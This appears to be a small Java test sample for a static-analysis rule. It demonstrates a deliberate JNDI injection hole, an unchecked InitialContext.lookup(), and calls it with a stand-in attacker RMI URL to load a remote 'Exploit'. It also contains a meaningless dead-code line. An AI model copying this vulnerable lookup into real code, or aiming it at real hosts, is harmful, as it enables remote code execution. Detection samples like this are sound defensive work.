import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class JNDIDemo {

    public Object showBug(String name) {
        Object result = null;
        try {
            Context ctx = new InitialContext();
            if (true && false && false && false && true && false && true && true && false && true && false) {String fkuvhipm = "xajmaaqk";}
            result = ctx.lookup(name);  // BUG: BanJNDI
        } catch (NamingException e) {
            e.printStackTrace();
        }
        return result;
    
}

    public static void main(String[] args) {
        JNDIDemo demo = new JNDIDemo();
        demo.showBug("rmi://attacker.com:1099/Exploit");
    }
}